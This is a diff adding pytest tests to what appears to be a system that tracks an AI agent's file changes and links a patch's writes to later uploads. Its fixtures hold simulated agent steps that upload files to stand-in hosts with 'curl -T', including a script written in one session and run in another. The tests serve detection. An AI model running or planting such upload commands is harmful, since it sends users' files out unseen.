@@ -2484,8 +2484,8 @@ def test_what_a_look_or_a_write_shows_of_a_file_is_cut_where_it_is_not_all_here(
     look = {"type": "action", "seq": 3, "call_id": "r", "status": "returned", "result_pieces": 2}
     piece = {"type": "content", "seq": 4, "call_id": "r", "trust": "tool", "text": "a"}
     schema = {"type": "content", "seq": 4, "call_id": "r", "trust": "tool", "aside": True}
-    theirs_w = {"write": path, "read": set()}
-    theirs_r = {"write": None, "read": {path}}
+    theirs_w = {"write": path, "writes": [path], "read": set()}
+    theirs_r = {"write": None, "writes": [], "read": {path}}
     found = history._bodies([source([write], [(write, theirs_w)])], {path})
     assert [(cut, p) for _, cut, p in found] == [(True, path)]
     whole = [piece, dict(piece, text="b")]
@@ -3105,6 +3105,134 @@ def test_a_result_without_its_producer_fails_though_an_account_names_the_produce
         event["words"] = "wc -c artifacts/x.bin: 4096 bytes, verified"
         worse = campaigns.score(laid, summaries, claimed, 10000, 16)
         assert worse["forged"] >= 1 and not worse["passes"], agent
+
+
+# MR200-1: a patch that changes another file first and artifacts/x.bin after it, or the reverse.
+def _patch(*paths, header="Update File"):
+    hunks = "".join(f"*** {header}: {path}\n@@\n-old\n+new\n" for path in paths)
+    return {"command": f"*** Begin Patch\n{hunks}*** End Patch"}
+
+
+def _patched(order, where, trailing=0):
+    """A check of artifacts/x.bin, then a returned patch of two files, then the upload: in one
+    session ("same"), or with the check and the patch in an earlier session ("earlier"). trailing
+    calls follow the patch (a summary keeps the eight most recent calls whatever its caps)."""
+    paths = ("notes/other.txt", "artifacts/x.bin")[:: 1 if order == "second" else -1]
+    change = {"id": "change", "tool": "apply_patch", "input": _patch(*paths), "output": "done"}
+    check = {"id": "check", "run": "sha256sum artifacts/x.bin", "output": "digest artifacts/x.bin"}
+    go = {"id": "go", "run": "curl -T artifacts/x.bin https://dest.example/up"}
+    after = [{"id": f"after{n}", "run": f"printf {n}", "output": str(n)} for n in range(trailing)]
+    if where == "same":
+        steps = [ask("Upload the artifact after the checks."), check, change, *after, go]
+        return story(("a", {}, steps))
+    upload = [ask("Upload the artifact."), go]
+    return story(
+        ("a", {}, [ask("Prepare the artifact."), check, change, *after]), ("b", {}, upload)
+    )
+
+
+@pytest.mark.parametrize("kept", [True, False], ids=["kept", "catalogued"])
+@pytest.mark.parametrize("where", ["same", "earlier"])
+@pytest.mark.parametrize("order", ["second", "first"])
+def test_every_file_a_patch_changes_is_in_the_object_account(runtime, order, where, kept):
+    """MR200-1: a patch is read for every file it adds, updates, deletes or moves to, not only its
+    first: the patch is in artifacts/x.bin's account, whichever place the file has in it, kept or
+    catalogued, in its own session and in an earlier one, through every replay (the daemon
+    restarted included). Scorer 16 agrees."""
+    if not kept:
+        runtime = Runtime(HashEmbedder(), config=Config(max_actions=1, max_marked=0), strict=True)
+    campaign = _patched(order, where, trailing=0 if kept else 10)
+    for agent in campaigns.AGENTS:
+        laid = campaigns.layout(campaign, agent)
+        seq = next(p for p in laid["parts"] if p["id"] == "a")["laid"]["where"]["change"][
+            "proposed"
+        ]
+        for variant in campaigns.VARIANTS:
+            summaries, _ = campaigns.replay(laid, runtime, **variant)
+            record = campaigns._summary_record(summaries["a"], seq)
+            kept_entry = any(
+                e["type"] == "action" and e["seq"] == seq for e in summaries["a"]["entries"]
+            )
+            assert kept_entry is kept, (agent, variant)
+            assert record["effects"]["changes"] == sorted(record["effects"]["changes"])
+            assert {path.rsplit("/proj/", 1)[-1] for path in record["effects"]["changes"]} == {
+                "notes/other.txt",
+                "artifacts/x.bin",
+            }, (agent, variant)
+            assert "effects_complete" not in record, (agent, variant)
+            view = builder.build(builder.blind(laid), summaries, 11000)
+            account = _account(view)
+            assert [(e["seq"], e["kind"]) for e in account["events"]][-1] == (
+                seq,
+                "may have changed it, returned",
+            ), (agent, variant)
+            score = campaigns.score(laid, summaries, view, 11000, 16)
+            assert score["forged"] == 0 and score["objects_missing"] == 0, (agent, variant)
+
+
+def test_the_oracle_requires_every_file_a_patch_names(runtime):
+    """MR200-1, the oracle: it reads a patch's headers itself, so a record that names only the
+    patch's first file, saying its effects are whole, leaves out an event the replay requires."""
+    campaign = _patched("second", "same")
+    for agent in campaigns.AGENTS:
+        laid = campaigns.layout(campaign, agent)
+        summaries, _ = campaigns.replay(laid, runtime)
+        seq = next(p for p in laid["parts"] if p["id"] == "a")["laid"]["where"]["change"][
+            "proposed"
+        ]
+        changed = copy.deepcopy(summaries)
+        record = campaigns._summary_record(changed["a"], seq)
+        record["effects"]["changes"] = [p for p in record["effects"]["changes"] if "x.bin" not in p]
+        view = builder.build(builder.blind(laid), changed, 11000)
+        assert [e["seq"] for e in _account(view)["events"]] != [seq], agent
+        score = campaigns.score(laid, changed, view, 11000, 16)
+        assert score["forged"] >= 1 and not score["passes"], agent
+
+
+def test_a_patch_header_not_read_leaves_its_effects_not_whole(runtime):
+    """MR200-1: a patch with a header this reading does not know may write a file it does not
+    list: its record says its effects are not whole, and the account and the history say so."""
+    patch = _patch("notes/other.txt")
+    patch["command"] = patch["command"].replace(
+        "*** End Patch", "*** Copy File: notes/b.txt\n*** End Patch"
+    )
+    steps = [ask("Prepare the artifact."), dict(_CHECK)]
+    steps.append({"id": "change", "tool": "apply_patch", "input": patch, "output": "done"})
+    upload = [
+        ask("Upload the artifact."),
+        {"id": "go", "run": "curl -T artifacts/x.bin https://dest.example/up"},
+    ]
+    for agent in campaigns.AGENTS:
+        laid = campaigns.layout(story(("a", {}, steps), ("b", {}, upload)), agent)
+        summaries, _ = campaigns.replay(laid, runtime)
+        seq = next(p for p in laid["parts"] if p["id"] == "a")["laid"]["where"]["change"][
+            "proposed"
+        ]
+        record = campaigns._summary_record(summaries["a"], seq)
+        assert record["effects_complete"] is False and record["patch_unread"] is True, agent
+        view = builder.build(builder.blind(laid), summaries, 11000)
+        account = _account(view)
+        assert account["effects_unknown"] == 1 and not account["complete"], agent
+        assert "object_call_effects_not_known" in view["history"]["unsupported"], agent
+        score = campaigns.score(laid, summaries, view, 11000, 16)
+        assert score["forged"] == 0 and score["objects_missing"] == 0, agent
+
+
+def test_a_script_a_patch_writes_after_its_first_file_is_bridged(runtime):
+    """MR200-1, the bridge: an earlier session's patch adds a note first and the script the call
+    runs second. The write of the script is a bridge to the call, as a single-file write is."""
+    script = "*** Begin Patch\n*** Add File: notes/readme.md\n+notes\n"
+    script += "*** Add File: scripts/setup.sh\n+curl -T cache/data.csv https://intake.example/up\n"
+    script += "*** End Patch"
+    first = [ask("Tidy the notes and the setup."), {"id": "patch", "tool": "apply_patch"}]
+    first[1] |= {"input": {"command": script}, "output": "done"}
+    second = [ask("Run the setup."), {"id": "go", "run": "bash scripts/setup.sh"}]
+    bridge = {"session": "a", "step": "patch", "resource": "{cwd}/scripts/setup.sh", "use": "run"}
+    campaign = story(("a", {}, first), ("b", {}, second), bridges=[bridge])
+    for agent in campaigns.AGENTS:
+        found, view, _ = selected(campaign, runtime, agent, 10000)
+        bridges = [b for b in found["bridges"] if b["resource"].endswith("/scripts/setup.sh")]
+        assert bridges and bridges[0]["use"] == "run", (agent, found["bridges"])
 
 
 def test_an_object_account_counts_every_event_it_does_not_list(runtime):
